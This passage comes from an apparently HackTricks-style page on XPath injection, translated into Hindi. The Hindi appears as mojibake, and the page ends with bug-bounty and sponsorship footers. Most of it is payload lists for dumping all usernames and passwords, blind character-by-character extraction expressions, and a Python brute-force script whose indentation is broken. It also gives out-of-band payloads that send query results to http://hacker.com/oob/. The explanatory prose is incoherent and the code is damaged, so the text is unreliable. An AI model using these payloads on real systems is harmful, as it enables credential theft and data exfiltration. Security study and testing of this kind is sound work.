рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реЛрддреА рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдЦреЛрдЬ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
## рдЕрдВрдзрд╛ рдЙрддреНрдкрд╛рджрди

### **рдорд╛рди рдХреА рд▓рдВрдмрд╛рдИ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рддреБрд▓рдирд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЗрд╕реЗ рдирд┐рдХрд╛рд▓реЗрдВ:**
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **Python рдЙрджрд╛рд╣рд░рдг**
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ

XPath рдЗрдВрдЬреЗрдХреНрд╢рди рдПрдХ рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рд╕рд╛рде рдПрдХ рдЖрдо рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрдмрдВрдзрд┐рдд рдбреЗрдЯрд╛ рдЦреЛрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рднрд╛рд╖рд╛ рд╣реИ рдЬреЛ XML рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдХреЗ рднреАрддрд░ рдбреЗрдЯрд╛ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИред

рдПрдХ XPath рдЗрдВрдЬреЗрдХреНрд╢рди рд╣рдорд▓рд╛ рдЙрд╕ рд╕рдордп рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЗрдирдкреБрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдЕрдкрдиреЗ XPath рдкреНрд░рд╢реНрди рдореЗрдВ рд╕реАрдзреЗ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ, рдмрд┐рдирд╛ рдЙрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдпрд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдП рдмрд┐рдирд╛ред рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдЗрдВрдЬреЗрдХреНрд╢рди рдкреНрд░рд╢реНрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрдмрдВрдзрд┐рдд рдбреЗрдЯрд╛ рдХреЛ рдЕрдкрдиреЗ рд▓рд╛рдн рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ, рдпрджрд┐ рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЗрдирдкреБрдЯ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдЕрдкрдиреЗ XPath рдкреНрд░рд╢реНрди рдореЗрдВ рд╕реАрдзреЗ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдкреНрд░рд╢реНрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрдмрдВрдзрд┐рдд рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЗрдирдкреБрдЯ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдЙрд╕реЗ рдЕрдкрдиреЗ XPath рдкреНрд░рд╢реНрди рдореЗрдВ рд╕реАрдзреЗ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреА рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ рд╕реБрдзрд╛рд░, рдФрд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рддрдХ рдкрд╣реБрдВрдЪ рдХреА рд╕реАрдорд╛рдУрдВ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдгред
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## OOB рд╢реЛрдз

### OOB рд╢реЛрдз рдХреНрдпрд╛ рд╣реИ?

рдмрд╛рд╣рд░реА рд╢реЛрдз (Out-of-Band Exploitation) рдПрдХ рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдореЗрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рдХрд╛рд░ рдХреА рдЕрдкрд╡рд╛рдж (рд╡рд┐рдирд╛рд╢рдХрд╛рд░реА) рдЯреЗрдХреНрдирд┐рдХ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдорд┐рдд рдбреЗрдЯрд╛ рдХреЛ рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдирд┐рд░реНрдорд┐рдд рдбреЗрдЯрд╛ рдХреЛ рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд░рдЦрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдкрдиреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

### OOB рд╢реЛрдз рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ?

рдПрдХ OOB рд╢реЛрдз рд╣рдорд▓рд╛ рдЖрдорддреМрд░ рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ:

1. рдПрдХ рдЕрджреНрдпрддрдиреАрдп рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдореЗрдВ рдПрдХ рдЕрдкрд╡рд╛рдж рдмрд┐рдВрджреБ рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ рдЬрд╣рд╛рдВ XPath рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
2. рдЕрдкрд╡рд╛рдж рдмрд┐рдВрджреБ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдирд┐рд░реНрдорд┐рдд XPath рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдХреЛ рдЗрд╕ рдмрд┐рдВрджреБ рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред
3. рдЕрдм, рдЬрдм рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЕрдкрд╡рд╛рдж рдмрд┐рдВрджреБ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ, рд╡рд╣ XPath рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдХреЛ рдЕрдкрдиреЗ рдЕрдВрддрд░реНрдЧрдд рд╡рд┐рд╢реЗрд╖ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрддрд╛ рд╣реИред
4. рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдирд┐рд░реНрдорд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдореЙрдирд┐рдЯрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЬрдм рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЙрдиреНрд╣реЗрдВ рдЕрдкрдиреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЙрдиреНрд╣реЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред

### OOB рд╢реЛрдз рдХреЗ рд▓рд╛рдн

рдмрд╛рд╣рд░реА рд╢реЛрдз рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдХреБрдЫ рд▓рд╛рдн рд╣реИрдВ:

- рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдореЗрдВ рдбреЗрдЯрд╛ рдЪреЛрд░реА, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдзрд┐рдЧреНрд░рд╣рдг рдФрд░ рдЕрдиреНрдп рдЕрдкрд╡рд╛рджреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- рдпрд╣ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрджреНрдпрддрдиреАрдп рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрддреНрдпрдзрд┐рдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
- рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдХрд░рдг рдФрд░ рдЕрдиреБрдХрд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### OOB рд╢реЛрдз рдХреА рдкреНрд░рдХрд╛рд░

рдмрд╛рд╣рд░реА рд╢реЛрдз рдХреЗ рдХреБрдЫ рдкреНрд░рдореБрдЦ рдкреНрд░рдХрд╛рд░ рд╣реИрдВ:

- рдмрд╛рд╣рд░реА рдПрдХреНрд╕рдлрд╝реАрд▓реНрдЯреНрд░реЗрд╢рди (Out-of-Band Exfiltration): рдЗрд╕рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдбреЗрдЯрд╛ рдХреЛ рдЕрдкрдиреЗ рдирд┐рд░реНрдорд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд╛рд╣рд░ рднреЗрдЬрддрд╛ рд╣реИред
- рдмрд╛рд╣рд░реА рдЕрдзрд┐рдЧреНрд░рд╣рдг (Out-of-Band Retrieval): рдЗрд╕рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдбреЗрдЯрд╛ рдХреЛ рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред
- рдмрд╛рд╣рд░реА рдЕрдзрд┐рдЧреНрд░рд╣рдг рдФрд░ рдПрдХреНрд╕рдлрд╝реАрд▓реНрдЯреНрд░реЗрд╢рди (Out-of-Band Retrieval and Exfiltration): рдЗрд╕рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдбреЗрдЯрд╛ рдХреЛ рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдФрд░ рднреЗрдЬрддрд╛ рд╣реИред

### OOB рд╢реЛрдз рдХреЗ рдЙрджрд╛рд╣рд░рдг

рдмрд╛рд╣рд░реА рд╢реЛрдз рдХреЗ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ:

- рдПрдХ рдЕрдкрд╡рд╛рдж рдмрд┐рдВрджреБ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдмрд╛рд╣рд░ рдбреЗрдЯрд╛ рднреЗрдЬрдирд╛ред
- рдПрдХ рдЕрдкрд╡рд╛рдж рдмрд┐рдВрджреБ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреБрдХреАрдЬрд╝ рдХреЛ рдЪреЛрд░реА рдХрд░рдирд╛ред
- рдПрдХ рдЕрдкрд╡рд╛рдж рдмрд┐рдВрджреБ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдХрд░рдг рдФрд░ рдЕрдиреБрдХрд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ред

### OOB рд╢реЛрдз рдХреЗ рдирд┐рд░рд╛рдХрд░рдг

рдмрд╛рд╣рд░реА рд╢реЛрдз рдХреЗ рдирд┐рд░рд╛рдХрд░рдг рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рд╣реИрдВ:

- рдЕрдкрд╡рд╛рдж рдмрд┐рдВрджреБрдУрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░реЗрдВред
- рдЕрдкрд╡рд╛рдж рдмрд┐рдВрджреБрдУрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреЛ рдХрдо рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╕рдВрдЧрдард┐рдд рд░рдЦреЗрдВред
- рдЕрдкрд╡рд╛рдж рдмрд┐рдВрджреБрдУрдВ рдХреЛ рд╕рддрд░реНрдХрддрд╛ рд╕реЗ рдЬрд╛рдВрдЪреЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдХреИрди рдХрд░реЗрдВред
- рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдореЙрдирд┐рдЯрд░ рдХрд░реЗрдВред

рдмрд╛рд╣рд░реА рд╢реЛрдз рдПрдХ рдкреНрд░рднрд╛рд╡реА рдЯреЗрдХреНрдирд┐рдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рдЕрдкрд╡рд╛рджреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдПрдХ рдЕрдЪреНрдЫрд╛ рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдЧрд░реВрдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╡рд╣ рдЕрдкрд╡рд╛рджреЛрдВ рдХреЛ рдирд┐рд░рд╛рдХрд░рдг рдХрд░ рд╕рдХреЗ рдФрд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░ рд╕рдХреЗред
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг

{% embed url="https://xcat.readthedocs.io/" %}

## рд╕рдВрджрд░реНрдн

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20injection" %}

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдХрд╛ рдШрд░ рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рдХреЗрд╡рд▓ рддрдм рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдЗрдирд╛рдо рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдЗрдирд╛рдо рдЙрд╕ рдмрдЧ рдХреЗ рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдорд┐рд▓реЗрдЧрд╛ред

**рд╡реЗрдм3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЙрдирдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ рд╡реЗрдм3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**рд╡реЗрдм3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддреНрдпреЗрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рд╣реИ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рд╣реИ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**ред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╣рдореЗрдВ PR рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред**

</details>
